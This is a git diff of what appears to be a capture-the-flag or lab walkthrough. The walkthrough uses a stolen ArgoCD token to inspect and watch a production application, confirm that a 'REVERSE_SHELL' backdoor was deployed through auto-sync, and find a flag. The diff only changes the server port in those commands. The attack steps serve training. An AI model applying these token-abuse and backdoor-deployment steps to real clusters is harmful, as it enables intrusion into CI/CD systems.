@@ -72,7 +72,7 @@ export ARGOCD_AUTH_TOKEN='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhcmdvY
 # List applications using the token
 argocd app list \
   --auth-token="$ARGOCD_AUTH_TOKEN" \
-  --server argocd.sc.local:31443 \
+  --server argocd.sc.local:31080 \
   --insecure \
   --grpc-web
 ```
@@ -93,7 +93,7 @@ Explore the current deployment to understand the attack surface.
 # Get application details using the stolen token
 argocd app get recipe-api-production \
   --auth-token="$ARGOCD_AUTH_TOKEN" \
-  --server argocd.sc.local:31443 \
+  --server argocd.sc.local:31080 \
   --insecure \
   --grpc-web
 ```
@@ -111,14 +111,14 @@ As an attacker, you don't have direct kubectl access to the production cluster. 
 # Get application resource details via ArgoCD
 argocd app resources recipe-api-production \
   --auth-token="$ARGOCD_AUTH_TOKEN" \
-  --server argocd.sc.local:31443 \
+  --server argocd.sc.local:31080 \
   --insecure \
   --grpc-web
 
 # Get detailed application manifest
 argocd app manifests recipe-api-production \
   --auth-token="$ARGOCD_AUTH_TOKEN" \
-  --server argocd.sc.local:31443 \
+  --server argocd.sc.local:31080 \
   --insecure \
   --grpc-web
 ```
@@ -210,7 +210,7 @@ ArgoCD is configured with `auto-sync`, so it will automatically detect the Git c
 # Watch the sync using the stolen token
 argocd app watch recipe-api-production \
   --auth-token="$ARGOCD_AUTH_TOKEN" \
-  --server argocd.sc.local:31443 \
+  --server argocd.sc.local:31080 \
   --insecure \
   --grpc-web
 ```
@@ -228,14 +228,14 @@ Verify the malicious configuration was deployed via ArgoCD:
 # Check application sync status
 argocd app get recipe-api-production \
   --auth-token="$ARGOCD_AUTH_TOKEN" \
-  --server argocd.sc.local:31443 \
+  --server argocd.sc.local:31080 \
   --insecure \
   --grpc-web
 
 # View the deployed manifests to confirm backdoor is present
 argocd app manifests recipe-api-production \
   --auth-token="$ARGOCD_AUTH_TOKEN" \
-  --server argocd.sc.local:31443 \
+  --server argocd.sc.local:31080 \
   --insecure \
   --grpc-web | grep -A 5 "REVERSE_SHELL"
 ```
@@ -250,7 +250,7 @@ The flag for this challenge is embedded in the ArgoCD application:
 # Get application details to find the flag
 argocd app get recipe-api-production \
   --auth-token="$ARGOCD_AUTH_TOKEN" \
-  --server argocd.sc.local:31443 \
+  --server argocd.sc.local:31080 \
   --insecure \
   --grpc-web \
   -o yaml | grep -i flag
